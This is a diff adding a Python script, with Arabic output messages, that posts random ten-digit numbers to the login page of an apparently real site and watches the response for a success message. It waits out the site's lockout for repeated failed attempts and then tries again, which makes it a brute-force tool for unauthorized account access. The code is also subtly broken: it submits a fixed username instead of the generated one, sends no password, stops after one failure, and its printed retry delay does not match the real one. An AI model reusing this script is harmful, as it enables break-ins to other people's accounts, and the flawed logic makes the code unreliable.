@@ -1,0 +1,54 @@
+import requests
+import random
+import time
+
+lst = []
+url = "http://moody.net/login"
+number1 = 7371439995
+while True:
+    number = random.randint(7000000000, 7999999999)
+    if number in lst:
+        continue
+    data = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        "username": number1
+    }
+    lst.append(number)
+    try:
+        session = requests.Session()
+        response = session.post(url, data=data)
+        content = response.content.decode(errors="ignore").lower()
+        if "تم تسجيل الدخول بنجاح" in content:
+            print(f"\n*** تم تسجيل الدخول بنجاح بـ {number} ***\n")
+            print("----- محتوى الرد -----\n")
+            print(content)
+            break
+        elif "لقد تم حظرك بسبب محاولات تسجيل الدخول الكثيرة الخاطئة" in content :
+            print(f"{number} غير صالح - النظام مشغول، إعادة المحاولة بعد 5 ثوانٍ")
+            print(content)
+            time.sleep(60)
+            continue
+        
+        else:
+            print(f"{number} غير صالح - محاولة فاشلة")
+            print(content)
+            break
+    except Exception as e:
+        print(f"خطأ في الطلب: {e}")
+
+
+
+'''
+import requests
+
+url = 'http://moody.net/login'
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+}
+
+session = requests.Session()
+res = session.get(url, headers=headers)
+
+# طباعة محتوى الصفحة
+print(res.text)
